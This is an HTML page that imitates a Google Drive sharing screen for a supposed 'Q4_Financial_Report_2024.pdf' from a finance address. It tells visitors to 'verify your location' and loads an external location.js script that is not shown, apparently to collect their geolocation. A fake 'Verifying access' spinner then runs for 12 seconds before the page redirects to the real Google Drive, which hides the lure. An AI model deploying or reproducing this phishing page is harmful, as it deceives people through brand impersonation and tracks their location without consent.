<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Drive – File Shared with You</title>
<style>
* { box-sizing:border-box; margin:0; padding:0; }
body {
    min-height:100vh;
    background:#f8f9fa;
    font-family:'Google Sans',Roboto,Arial,sans-serif;
    display:flex; flex-direction:column;
}
header {
    background:#fff;
    border-bottom:1px solid #e0e0e0;
    padding:.75rem 1.5rem;
    display:flex; align-items:center; justify-content:space-between;
}
.logo { font-size:1.2rem; font-weight:500; color:#5f6368; letter-spacing:-.5px; }
.btn-avatar {
    width:34px; height:34px; border-radius:50%;
    background:#4285F4; color:#fff;
    border:none; font-size:.9rem; font-weight:600; cursor:pointer;
}
main {
    flex:1; display:flex; align-items:center; justify-content:center; padding:2rem;
}
.card {
    background:#fff;
    border-radius:8px;
    box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.08);
    padding:2.5rem;
    max-width:420px;
    width:100%;
}
.file-icon { font-size:3.5rem; margin-bottom:1rem; }
.file-name { font-size:1.1rem; font-weight:500; color:#202124; margin-bottom:.5rem; }
.shared-by { font-size:.85rem; color:#5f6368; margin-bottom:1.5rem; }
.shared-by strong { color:#202124; }
.info {
    display:flex; align-items:center; gap:.6rem;
    font-size:.85rem; color:#5f6368; margin-bottom:.6rem;
}
.divider { height:1px; background:#e0e0e0; margin:1.5rem 0; }
.btn {
    display:block; width:100%;
    padding:.7rem;
    border:none; border-radius:4px;
    font-size:.95rem; font-weight:500; cursor:pointer;
    margin-bottom:.75rem;
    transition:background .2s;
}
.btn-primary {
    background:#1a73e8; color:#fff;
}
.btn-primary:hover { background:#1557b0; }
.btn-secondary {
    background:#fff; color:#1a73e8;
    border:1px solid #dadce0;
}
.btn-secondary:hover { background:#f8f9fa; }
.footer { font-size:.75rem; color:#80868b; text-align:center; margin-top:1.5rem; }
#overlay {
    display:none; position:fixed; inset:0;
    background:rgba(255,255,255,.9); z-index:99;
    flex-direction:column; align-items:center; justify-content:center; gap:1rem;
}
#overlay.show { display:flex; }
.spinner {
    width:40px; height:40px;
    border:4px solid #e0e0e0;
    border-top-color:#1a73e8;
    border-radius:50%;
    animation:spin .8s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg); } }
#overlay p { color:#5f6368; font-size:.9rem; }
</style>
</head>
<body>

<header>
    <div class="logo">🔵 Google Drive</div>
    <button class="btn-avatar">U</button>
</header>

<main>
    <div class="card">
        <div class="file-icon">📄</div>
        <div class="file-name">Q4_Financial_Report_2024.pdf</div>
        <div class="shared-by">Shared by <strong>finance@company.com</strong></div>
        
        <div class="info">📁 <span>Google Drive</span></div>
        <div class="info">📅 <span>June 12, 2026</span></div>
        <div class="info">🔒 <span>Verify your location to access</span></div>
        
        <div class="divider"></div>
        
        <button class="btn btn-primary" onclick="open_file()">📂 Open File</button>
        <button class="btn btn-secondary" onclick="open_file()">➕ Add to My Drive</button>
        
        <div class="footer">
            This file is shared with you. Location verification may be required.
        </div>
    </div>
</main>

<div id="overlay">
    <div class="spinner"></div>
    <p id="text">Verifying access...</p>
</div>

<script src="../js/location.js"></script>
<script>
var steps = ["Verifying...", "Checking...", "Loading...", "Processing..."];
var i = 0;
function open_file() {
    document.getElementById("overlay").classList.add("show");
    var t = setInterval(() => {
        i = (i+1) % steps.length;
        document.getElementById("text").textContent = steps[i];
    }, 2000);
    setTimeout(() => {
        clearInterval(t);
        window.location.href = "https://drive.google.com";
    }, 12000);
}
</script>
</body>
</html>
